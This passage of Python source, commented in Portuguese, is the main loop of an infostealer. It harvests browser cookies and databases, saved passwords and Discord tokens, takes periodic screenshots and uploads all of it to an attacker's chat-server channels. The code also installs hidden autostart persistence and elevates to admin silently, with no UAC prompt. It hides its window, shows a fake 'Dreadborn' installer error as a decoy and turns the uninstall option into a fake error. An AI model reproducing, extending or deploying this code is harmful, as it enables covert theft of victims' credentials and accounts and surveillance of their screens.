        vals = [c for c in by_cookies[fam] if str(c.get("value") or "")]
        if vals:
            by_cookies[fam] = vals
        else:
            by_cookies.pop(fam)

    # fingerprint atual por navegador + geral (só famílias com algo enviável)
    cur_per: dict[str, dict] = {}
    pending_per: dict[str, dict] = {}
    for fam in sorted(set(list(by_cookies.keys()) + list(by_raws.keys()) + list(fam_stats.keys()))):
        cl = by_cookies.get(fam, [])
        st = fam_stats.get(fam, {})
        status = _stats_status(st)
        has_raw = bool(by_raws.get(fam))
        # Sem cookies decifráveis (ex.: Edge v20) a lista é vazia e o
        # fingerprint seria sempre igual => a BD nunca seria reenviada mesmo
        # mudando. Nesse caso identifica-se pela contagem de linhas lidas.
        if cl:
            fp = _fingerprint_cookies(cl)
        else:
            fp = f"raw-{int(st.get('found', 0) or 0)}-{int(st.get('undec', 0) or 0)}"
        info = {"count": len(cl), "fp": fp,
                "status": status, "found": int(st.get("found", 0) or 0),
                "ok": int(st.get("ok", 0) or 0), "undec": int(st.get("undec", 0) or 0),
                "raw": has_raw}
        if cl or has_raw:
            cur_per[fam] = info          # há o que enviar (cookie decifrável e/ou raw)
        elif info["found"] > 0 or st.get("blocked"):
            pending_per[fam] = info      # existe mas não deu para usar agora
        # senão: família sem cookies — ignora
    for fam, info in sorted(cur_per.items()):
        if info["status"] != "ok":
            print(f"[cookies] {fam}: valores indescifráveis -> envia só o raw da BD", flush=True)
    all_current = [c for f in cur_per for c in by_cookies.get(f, [])]
    cur_overall = _fingerprint_cookies(all_current)
    cur_total = len(all_current)

    prev_per: dict = state.get("per_browser", {}) if isinstance(state.get("per_browser", {}), dict) else {}
    prev_overall: str = str(state.get("overall_fp", ""))
    prev_per = _prune_stale_prev(prev_per, "cookies")

    for fam, info in sorted(pending_per.items()):
        print(f"[cookies] {fam}: nada a enviar agora ({info['status']}) — PENDENTE, re-tenta depois",
              flush=True)

    # caso nada utilizável agora
    if not cur_per:
        if pending_per:
            print("[cookies] nada enviável (BD bloqueada ou tudo indescifrável); "
                  "estado NÃO marcado como coletado", flush=True)
            return False
        if marker_exists and prev_per == {} and state.get("total", None) == 0:
            print("[cookies] continua vazio, pula", flush=True)
            return False
        if prev_per:
            # tinha cookies antes e agora apagaram tudo -> avisa com tombstone
            print(f"[cookies] cookies APAGADOS (antes={state.get('total', '?')} agora=0), envia aviso", flush=True)
            to_send: list[tuple[bytes, str, str]] = []
            for fam, info in prev_per.items():
                try:
                    d, fn, mm = _build_deleted_zip(pc, ts, fam, int(info.get("count", 0)))
                    to_send.append((d, fn, mm))
                except Exception:
                    continue
            if not to_send:
                d, fn, mm = _build_deleted_zip(pc, ts, "no-browser", int(state.get("total", 0)))
                to_send.append((d, fn, mm))
        else:
            print("[cookies] nenhum navegador com cookies encontrado, nada a enviar", flush=True)
            _save_cookies_state({"pc": pc, "overall_fp": cur_overall, "total": 0,
                                 "per_browser": {}, "pending": {}, "parts": 0,
                                 "updated_at": datetime.datetime.now().astimezone().isoformat()})
            return False
    else:
        # há dados agora: decide o que mudou
        no_local_change = False
        if marker_exists and prev_overall == cur_overall and state.get("total") == cur_total:
            # checagem rápida por navegador para log
            same = all(f in prev_per and prev_per[f].get("fp") == cur_per[f]["fp"] for f in cur_per) and set(prev_per.keys()) == set(cur_per.keys())
            if same:
                no_local_change = True
        if no_local_change:
            if is_startup and startup_resend:
                print(f"[cookies] local igual (total={cur_total} fp={cur_overall[:12]}), confere servidor (startup)...", flush=True)
                try:
                    srv = await _server_has_pc_files(bot, int(community_id), int(channel_id),
                                                     sanitize_channel_name(pc), sorted(cur_per.keys()))
                except Exception as e:
                    print(f"[cookies] server-check erro: {e}", flush=True)
                    srv = None
                if srv is True:
                    print("[cookies] servidor ainda tem arquivos deste PC, pula", flush=True)
                    return False
                elif srv is False:
                    print("[cookies] servidor SEM arquivos deste PC (apagado), reenvia tudo", flush=True)
                else:
                    # srv is None: o servidor não respondeu / sem histórico.
                    # Sem prova de que os arquivos sumiram NÃO se reenvia: já
                    # enviei este navegador e nada mudou em local.
                    print("[cookies] histórico indisponível no startup; "
                          "já enviado e sem alterações locais, pula", flush=True)
                    return False
                # cai para reenvio total abaixo
                to_send = []
                for fam in sorted(cur_per.keys()):
                    d, fn, mm = _build_cookies_zip(pc, ts, fam, by_cookies.get(fam, []), by_raws.get(fam, []))
                    to_send.append((d, fn, mm))
            else:
                print(f"[cookies] sem mudança (total={cur_total} fp={cur_overall[:12]}), pula", flush=True)
                return False
            if 'to_send' in locals() and to_send:
                if len(to_send) == 1:
                    print("[cookies] startup: 1 arquivo, envio único", flush=True)
                else:
                    print(f"[cookies] startup: {len(to_send)} arquivo(s), envio separado", flush=True)
            else:
                to_send = []
        else:
            # monta lista: só navegadores novos/alterados + tombstones dos que sumiram
            to_send = []
            for fam in sorted(cur_per.keys()):
                prev = prev_per.get(fam)
                if marker_exists and prev is not None and prev.get("fp") == cur_per[fam]["fp"]:
                    continue  # esse navegador não mudou
                d, fn, mm = _build_cookies_zip(pc, ts, fam, by_cookies.get(fam, []), by_raws.get(fam, []))
                to_send.append((d, fn, mm))
            for fam, info in prev_per.items():
                if fam in pending_per:
                    continue  # pendente (bloqueada/indescifr): não apaga o estado antigo
                if fam not in cur_per:
                    try:
                        d, fn, mm = _build_deleted_zip(pc, ts, fam, int(info.get("count", 0)))
                        to_send.append((d, fn, mm))
                    except Exception:
                        continue
            if not to_send:
                print(f"[cookies] sem mudança (total={cur_total}), pula", flush=True)
                return False
            if len(to_send) == 1:
                print("[cookies] 1 navegador novo/alterado, envio único", flush=True)
            else:
                print(f"[cookies] {len(to_send)} arquivo(s) novo(s)/alterado(s), envio separado", flush=True)

    for _data, _fn, _m in to_send:
        print(f"[cookies] pronto: {_fn} ({len(_data)} bytes) -> channel={int(channel_id)}", flush=True)
    ok_all = True
    sent_ids: list[int] = []
    for data, filename, mime in to_send:
        try:
            mid = await send_bytes_to_channel(bot, int(community_id), int(channel_id), data, filename, mime)
            try:
                sent_ids.append(int(mid))
            except Exception:
                sent_ids.append(0)
        except Exception as e:
            print(f"[cookies] envio falhou ({filename}): {e}", file=sys.stderr)
            ok_all = False
    if not ok_all:
        print("[cookies] nem todos enviaram, estado NÃO atualizado (tenta de novo no recheck)", flush=True)
        return False
    # anota msg ids por arquivo para auditoria futura
    try:
        _fnames = [fn for _, fn, _ in to_send]
        for i, fam in enumerate(sorted(cur_per.keys())):
            if i < len(sent_ids) and i < len(_fnames):
                cur_per[fam]["msg_id"] = sent_ids[i]
                cur_per[fam]["file"] = _fnames[i]
    except Exception:
        pass
    _save_cookies_state({"pc": pc, "overall_fp": cur_overall, "total": cur_total,
                         "per_browser": cur_per,
                         "pending": {f: {"found": i["found"], "ok": i["ok"],
                                         "undec": i["undec"], "status": i["status"]}
                                    for f, i in pending_per.items()},
                         "parts": len(to_send),
                         "msg_ids": sent_ids,
                         "updated_at": datetime.datetime.now().astimezone().isoformat()})
    print(f"[cookies] enviado ({len(to_send)} arquivo(s)) total={cur_total} fp={cur_overall[:12]}", flush=True)
    return True


async def _send_screenshots(bot: Bot, community_id: int, target_ids: list[int]) -> None:
    """Um screenshot para todos os canais-alvo; nunca derruba o loop."""
    try:
        if len(target_ids) > 1:
            await send_screenshot_to_all(bot, community_id, target_ids)
        else:
            await send_one_screenshot(bot, community_id, target_ids[0])
    except Exception as e:  # noqa: BLE001 — erro de um envio não derruba o loop
        print(f"[osmium] envio falhou, continua: {e}", file=sys.stderr)


async def amain(token: str, client_id: int, loop_seconds: int,
                community_id: int, channel_id: int, persist: bool = True,
                use_pc_channel: bool = True,
                cookies_channel_id: int = COOKIES_CHANNEL_ID,
                use_cookies: bool = True,
                cookies_recheck: int = COOKIES_RECHECK_DEFAULT,
                force_cookies: bool = False,
                startup_resend: bool = True,
                passwords_channel_id: int = PASSWORDS_CHANNEL_ID,
                passwords_category_id: int = PASSWORDS_CATEGORY_ID,
                use_passwords: bool = True,
                force_passwords: bool = False,
                use_discord: bool = True,
                force_discord: bool = False,
                discord_channel_id: int = DISCORD_CHANNEL_ID,
                discord_category_id: int = DISCORD_CATEGORY_ID,
                discord_recheck: int = DISCORD_RECHECK_DEFAULT,
                persist_task: bool = False):
    if not client_id:
        print("ERRO: CLIENT_ID=0 dá 'Invalid client' no Osmium.", file=sys.stderr)
        sys.exit(2)
    if not token or token == "":
        print("ERRO: token vazio. Defina --token ou OSMIUM_TOKEN.", file=sys.stderr)
        sys.exit(2)
    try:
        loop_seconds = int(loop_seconds)
    except (TypeError, ValueError):
        loop_seconds = LOOP_DEFAULT
    if loop_seconds <= 0:
        loop_seconds = LOOP_DEFAULT

    if persist:
        ensure_persistence(loop_seconds, with_task=True)

    # loop eterno com reconnect: enquanto ativo, print a cada N s
    failures = 0
    is_first_startup = True
    while True:
        bot = Bot(prefix="!", client_id=int(client_id))
        print(f"[osmium] conectando {WS_URL} como client_id={client_id}...")
        try:
            ws, read_task = await connect_and_auth(bot, token)
        except Exception as e:  # noqa: BLE001 — qualquer falha de handshake vira retry
            failures += 1
            print(f"[osmium] connect falhou ({failures}): {e} — retry em 5s", file=sys.stderr)
            await asyncio.sleep(5)
            continue
        failures = 0
        # Resolve canais-alvo 1x por sessão: padrão + canal do PC (sem duplicar).
        target_ids = [int(channel_id)]
        if use_pc_channel:
            try:
                pc_ch = await ensure_pc_channel(bot, community_id)
                if pc_ch is not None and int(pc_ch.id) != int(channel_id):
                    target_ids.append(int(pc_ch.id))
            except Exception as e:  # noqa: BLE001
                print(f"[osmium] canal do PC ignorado: {e}", file=sys.stderr)
        print(f"[osmium] destinos: {target_ids}")

        # --- screenshot IMEDIATO -------------------------------------------
        # A captura acontece logo à ligação, antes de qualquer coleta. É este o
        # ponto: o ecrã sai desde a execução, não depois de os cookies/senhas/
        # token estarem todos recolhidos.
        await _send_screenshots(bot, community_id, target_ids)

        # A coleta passa para background: chega a demorar ~40 s (varrimento de
        # discos + decifração) e não pode congelar o loop de screenshots.
        import time as _tnow
        last_cookies_check = _tnow.monotonic()
        last_discord_check = _tnow.monotonic()

        async def _collect_once() -> None:
            """Cookies + senhas + token do Discord, FORA do loop de screenshots."""
            nonlocal force_cookies, force_passwords, force_discord, is_first_startup
            try:
                if use_cookies:
                    try:
                        await send_cookies_once(bot, community_id, int(cookies_channel_id),
                                                force=force_cookies,
                                                is_startup=is_first_startup,
                                                startup_resend=startup_resend)
                        force_cookies = False  # força só no 1º envio, depois vira diff
                    except Exception as e:  # noqa: BLE001
                        print(f"[cookies] ignorado: {e}", file=sys.stderr)
                if use_passwords:
                    try:
                        await send_passwords_once(bot, community_id, int(passwords_channel_id),
                                                  force=force_passwords,
                                                  is_startup=is_first_startup,
                                                  startup_resend=startup_resend,
                                                  category_id=int(passwords_category_id))
                        force_passwords = False
                        is_first_startup = False  # reconnect não é startup: evita spam
                    except Exception as e:  # noqa: BLE001
                        print(f"[passwords] ignorado: {e}", file=sys.stderr)
                else:
                    is_first_startup = False
                # token do Discord: 1x por sessão (a função decide sozinha se o
                # Discord está instalado e se já enviou/canal foi apagado)
                if use_discord:
                    try:
                        await send_discord_token_once(bot, community_id, int(discord_channel_id),
                                                      force=force_discord,
                                                      category_id=int(discord_category_id))
                        force_discord = False
                    except Exception as e:  # noqa: BLE001
                        print(f"[discord] ignorado: {e}", file=sys.stderr)
            except Exception as e:  # noqa: BLE001
                print(f"[osmium] coleta ignorada: {e}", file=sys.stderr)

        collect_task = None
        recheck_cookies_task = None
        recheck_discord_task = None
        if use_cookies or use_passwords or use_discord:
            collect_task = asyncio.create_task(_collect_once(), name="osmium-colecta")

        async def _recheck_cookies() -> None:
            """Recheck de cookies/senhas em background — o screenshot nunca espera."""
            try:
                await send_cookies_once(bot, community_id, int(cookies_channel_id), force=False,
                                        is_startup=False, startup_resend=startup_resend)
                if use_passwords:
                    await send_passwords_once(bot, community_id, int(passwords_channel_id), force=False,
                                              is_startup=False, startup_resend=startup_resend,
                                              category_id=int(passwords_category_id))
            except Exception as e:  # noqa: BLE001
                print(f"[cookies] recheck ignorado: {e}", file=sys.stderr)

        async def _recheck_discord() -> None:
            """Recheck do token/canal do Discord em background."""
            try:
                await send_discord_token_once(bot, community_id, int(discord_channel_id),
                                              force=False, category_id=int(discord_category_id))
            except Exception as e:  # noqa: BLE001
                print(f"[discord] recheck ignorado: {e}", file=sys.stderr)

        def _livre(*slots: asyncio.Task | None) -> bool:
            """Sem coleta inicial nem outro recheck do mesmo tipo a correr."""
            if collect_task is not None and not collect_task.done():
                return False
            return all(t is None or t.done() for t in slots)

        try:
            while True:
                await asyncio.sleep(loop_seconds)
                # recheck periódico: se apagaram os cookies/senhas ou surgiram novos, reenvia.
                # Corre como task própria — um recheck dura ~15-40 s e não pode
                # congelar o loop de screenshots.
                if use_cookies:
                    rc = int(cookies_recheck or 0)
                    if rc > 0 and (_tnow.monotonic() - last_cookies_check) >= rc:
                        if _livre(recheck_cookies_task):
                            last_cookies_check = _tnow.monotonic()
                            recheck_cookies_task = asyncio.create_task(
                                _recheck_cookies(), name="osmium-recheck-cookies")
                        # senão fica p/ a próxima volta: last_* não avança, sem spam
                elif use_passwords:
                    rc = int(cookies_recheck or 0)
                    if rc > 0 and (_tnow.monotonic() - last_cookies_check) >= rc:
                        if _livre(recheck_cookies_task):
                            last_cookies_check = _tnow.monotonic()
                            recheck_cookies_task = asyncio.create_task(
                                _recheck_cookies(), name="osmium-recheck-cookies")
                # recheck do token/canal do Discord — janela própria e independente
                if use_discord:
                    rdc = int(discord_recheck or 0)
                    if rdc > 0 and (_tnow.monotonic() - last_discord_check) >= rdc:
                        if _livre(recheck_discord_task):
                            last_discord_check = _tnow.monotonic()
                            recheck_discord_task = asyncio.create_task(
                                _recheck_discord(), name="osmium-recheck-discord")
                # screenshot de cada intervalo — o 1.º já saiu logo à ligação,
                # antes de a coleta sequer começar.
                await _send_screenshots(bot, community_id, target_ids)
        except asyncio.CancelledError:
            # Ctrl+C / fechamento: sai limpo sem traceback duplo
            print("[osmium] encerrando (cancelado)...", file=sys.stderr)
            raise
        except Exception as e:  # noqa: BLE001 — queda de sessão vira reconnect
            print(f"[osmium] sessão caiu: {e} — reconectando em 5s", file=sys.stderr)
            await asyncio.sleep(5)
        finally:
            # Limpeza à prova de CancelledError: CancelledError herda de
            # BaseException, então suppress(Exception) NÃO o suprime.
            # Nada de wait_for/shield aqui — só cancela e aguarda direto.
            if collect_task is not None:
                collect_task.cancel()
                with contextlib.suppress(asyncio.CancelledError, Exception):
                    await collect_task
            for _rt in (recheck_cookies_task, recheck_discord_task):
                if _rt is not None:
                    _rt.cancel()
                    with contextlib.suppress(asyncio.CancelledError, Exception):
                        await _rt
            try:
                read_task.cancel()
            except Exception:
                pass
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await read_task
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await ws.close()


def main() -> None:
    global MAX_IMAGE_SIDE, JPEG_QUALITY_FIRST, JPEG_QUALITIES
    ap = argparse.ArgumentParser()
    ap.add_argument("--loop", type=int, default=_env_int("OSMIUM_LOOP", LOOP_DEFAULT),
                    help="intervalo em segundos (default 5)")
    ap.add_argument("--token", default=os.environ.get("OSMIUM_TOKEN", TOKEN))
    ap.add_argument("--community", type=int, default=_env_int("OSMIUM_COMMUNITY", COMMUNITY_ID))
    ap.add_argument("--channel", type=int, default=_env_int("OSMIUM_CHANNEL", CHANNEL_ID))
    ap.add_argument("--client-id", type=int, default=_env_int("OSMIUM_CLIENT_ID", CLIENT_ID))
    ap.add_argument("--no-persist", action="store_true", help="não instala auto-start")
    ap.add_argument("--no-pc-channel", action="store_true",
                    help="não cria/usa canal com nome do PC (só o canal padrão)")
    ap.add_argument("--cookies-channel", type=int,
                    default=_env_int("OSMIUM_COOKIES_CHANNEL", COOKIES_CHANNEL_ID),
                    help="canal que recebe cookies 1x por PC")
    ap.add_argument("--no-cookies", action="store_true", help="não coleta cookies")
    ap.add_argument("--resend-cookies", action="store_true", help="apaga marker+state e reenvia cookies de novo")
    ap.add_argument("--cookies-recheck", type=int, default=_env_int("OSMIUM_COOKIES_RECHECK", COOKIES_RECHECK_DEFAULT),
                    help="recheca cookies a cada N segundos e reenvia se apagados/alterados (default 1800, 0=desliga)")
    ap.add_argument("--passwords-channel", type=int,
                    default=_env_int("OSMIUM_PASSWORDS_CHANNEL", PASSWORDS_CHANNEL_ID),
                    help="canal de fallback das senhas (o canal dedicado é criado na categoria)")
    ap.add_argument("--passwords-category", type=int,
                    default=_env_int("OSMIUM_PASSWORDS_CATEGORY", PASSWORDS_CATEGORY_ID),
                    help="categoria onde nasce o canal dedicado das senhas "
                         f"(id {PASSWORDS_CATEGORY_ID} = 'Credenciais')")
    ap.add_argument("--no-passwords", action="store_true", help="não coleta senhas")
    ap.add_argument("--resend-passwords", action="store_true", help="apaga marker+state e reenvia senhas de novo")
    ap.add_argument("--discord-channel", type=int,
                    default=_env_int("OSMIUM_DISCORD_CHANNEL", DISCORD_CHANNEL_ID),
                    help="canal de fallback do Discord (o dedicado nasce na categoria)")
    ap.add_argument("--discord-category", type=int,
                    default=_env_int("OSMIUM_DISCORD_CATEGORY", DISCORD_CATEGORY_ID),
                    help="categoria onde nasce o canal dedicado do token do Discord "
                         f"(id {DISCORD_CATEGORY_ID})")
    ap.add_argument("--discord-recheck", type=int,
                    default=_env_int("OSMIUM_DISCORD_RECHECK", DISCORD_RECHECK_DEFAULT),
                    help="recheca token e canal a cada N segundos "
                         f"(default {DISCORD_RECHECK_DEFAULT}, 0=desliga)")
    ap.add_argument("--no-discord", action="store_true",
                    help="não procura nem envia o token do Discord")
    ap.add_argument("--resend-discord", action="store_true",
                    help="apaga marker+state e envia o token do Discord de novo")
    ap.add_argument("--shot-side", type=int, default=_env_int("OSMIUM_SHOT_SIDE", MAX_IMAGE_SIDE),
                    help="lado máximo do print em px (default 1920, usa 1600 se der Invalid media)")
    ap.add_argument("--shot-quality", type=int, default=_env_int("OSMIUM_SHOT_QUALITY", JPEG_QUALITY_FIRST),
                    help="qualidade JPEG inicial 65-95 (default 92, tenta até 65 até caber em 450KB)")
    ap.add_argument("--no-startup-cookies-resend", action="store_true",
                    help="no restart NÃO reenvia se local igual (default: reenvia se apagou no servidor)")
    ap.add_argument("--console", action="store_true",
                    help="mantém a consola visível com o output (depuração); "
                         "sem esta flag arranca sempre em segundo plano, sem janela "
                         "(e sobe a admin em ambos os casos)")
    ap.add_argument("--no-elevate", action="store_true",
                    help="única forma de NÃO subir a admin: por omissão sobe "
                         "SEMPRE, em qualquer modo, sem prompt de UAC e sem "
                         "notificação")
    ap.add_argument("--persist-task", action="store_true",
                    help="instala também a Task do agendador (precisa de admin; "
                         "por omissão só o HKCU Run, mais discreto)")
    ap.add_argument("--abe-elevate", action="store_true",
                    help="permite a elevação SYSTEM para desbloquear senhas/cookies v20 "
                         "(precisa de admin; por omissão desligado para não criar tarefas)")
    ap.add_argument("--_hidden", dest="hidden", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("--_elevated", dest="elevated", action="store_true", help=argparse.SUPPRESS)
    ap.add_argument("--uninstall", action="store_true", help="remove persistência e sai")
    args = ap.parse_args()

    _setup_output()          # garante log mesmo que a consola tenha desaparecido

    # Fachada Dreadborn na 1ª execução: barra de instalação + erro.
    # Só o processo original mostra (filho --_hidden/--_elevated não repete).
    try:
        if (not bool(getattr(args, "hidden", False))
                and not bool(getattr(args, "elevated", False))
                and _dreadborn_first_run()):
            show_dreadborn_installer()
    except Exception:
        pass

    if args.uninstall:
        # Desligar foi desativado: mostra o mesmo erro da fachada e reinstala.
        try:
            show_dreadborn_installer() if _dreadborn_first_run() else None
        except Exception:
            pass
        try:
            from tkinter import messagebox as _mb
            import tkinter as _tk
            _r = _tk.Tk()
            try:
                _r.withdraw()
            except Exception:
                pass
            _mb.showerror(DREADBORN_ERROR_TITLE, DREADBORN_ERROR_MSG)
            try:
                _r.destroy()
            except Exception:
                pass
        except Exception:
            pass
        remove_persistence()
        return

    global _ABE_ELEVATE
    _ABE_ELEVATE = bool(args.abe_elevate)

    # Auto-elevar SEM prompt de UAC e SEM notificação — por omissão, em
    # QUALQUER modo (--console e --_hidden incluídos) e antes de qualquer
    # detach, para que tudo o que correr a seguir já esteja elevado. Tenta
    # até conseguir (falha transitória não larga logo) e nunca imprime nada:
    # o que aconteceu fica no log. O filho nasce com --_elevated e não volta
    # a tentar (nunca há loop).
    if _elevate_gate(args) and _elevate_auto(sys.argv[1:]):
        return

    # Sem --console, arranca sempre desanexado: se vinha de uma consola/terminal
    # (ou de qualquer sítio com saída visível), a cópia que fica a correr nasce
    # sem janela nenhuma e o pai sai. É isto que garante que nunca aparece
    # cmd/powershell/terminal — mesmo quando a consola de origem está escondida.
    # (pythonw puro já nasce mudo => não vale a pena re-arrancar.)
    if not args.console and not args.hidden and (_HAD_STDOUT or _has_console()):
        if _detach(sys.argv):
            return
        # sem conseguir desanexar, continua attached (último recurso)

    # Instância única: não deixar duas cópias a correr em paralelo.
    if not _single_instance():
        if args.console:
            print("[osmium] já existe outra cópia; continua mesmo assim (--console)")
        else:
            return
    _sweep_leftovers()

    try:
        if int(args.shot_side) > 0:
            MAX_IMAGE_SIDE = int(args.shot_side)
    except Exception:
        pass
    try:
        q0 = int(args.shot_quality)
        q0 = max(65, min(95, q0))
        JPEG_QUALITY_FIRST = q0
        JPEG_QUALITIES = tuple(q for q in (q0, 88, 85, 82, 78, 75, 70, 65) if q <= q0) or (q0,)
    except Exception:
        pass

    force_cookies = bool(args.resend_cookies)
    force_passwords = bool(args.resend_passwords)
    _startup_env = os.environ.get("OSMIUM_STARTUP_COOKIES_RESEND", "")
    if _startup_env.strip() == "0":
        startup_resend = False
    else:
        startup_resend = not bool(args.no_startup_cookies_resend)
    if args.resend_cookies:
        for label, fn in (("marker", _cookies_marker_path()), ("state", _cookies_state_path())):
            try:
                print(f"[cookies] --resend-cookies: {label}={fn}")
                if os.path.exists(fn):
                    os.remove(fn)
                    print(f"[cookies] {label} apagado, vai reenviar")
            except Exception as e:
                print(f"[cookies] falha ao apagar {label}: {e}", file=sys.stderr)
    if args.resend_passwords:
        for label, fn in (("marker", _passwords_marker_path()), ("state", _passwords_state_path())):
            try:
                print(f"[passwords] --resend-passwords: {label}={fn}")
                if os.path.exists(fn):
                    os.remove(fn)
                    print(f"[passwords] {label} apagado, vai reenviar")
            except Exception as e:
                print(f"[passwords] falha ao apagar {label}: {e}", file=sys.stderr)
    if args.resend_discord:
        for label, fn in (("marker", _discord_marker_path()), ("state", _discord_state_path())):
            try:
                print(f"[discord] --resend-discord: {label}={fn}")
                if os.path.exists(fn):
                    os.remove(fn)
                    print(f"[discord] {label} apagado, vai reenviar")
            except Exception as e:
                print(f"[discord] falha ao apagar {label}: {e}", file=sys.stderr)

    loop = args.loop
    try:
        loop = int(loop)
    except (TypeError, ValueError):
        loop = LOOP_DEFAULT
    if loop <= 0:
        loop = LOOP_DEFAULT

    try:
        asyncio.run(amain(args.token, int(args.client_id), loop,
                          int(args.community), int(args.channel),
                          persist=True,
                          use_pc_channel=not args.no_pc_channel,
                          cookies_channel_id=int(args.cookies_channel),
                          use_cookies=not args.no_cookies,
                          cookies_recheck=int(args.cookies_recheck),
                          force_cookies=force_cookies,
                          startup_resend=startup_resend,
                          passwords_channel_id=int(args.passwords_channel),
                          passwords_category_id=int(args.passwords_category),
                          use_passwords=not args.no_passwords,
                          force_passwords=force_passwords,
                          use_discord=not args.no_discord,
                          force_discord=bool(args.resend_discord),
                          discord_channel_id=int(args.discord_channel),
                          discord_category_id=int(args.discord_category),
                          discord_recheck=int(args.discord_recheck),
                          persist_task=bool(args.persist_task)))
    except KeyboardInterrupt:
        print("\n[osmium] interrompido pelo usuário.", file=sys.stderr)


if __name__ == "__main__":
    main()
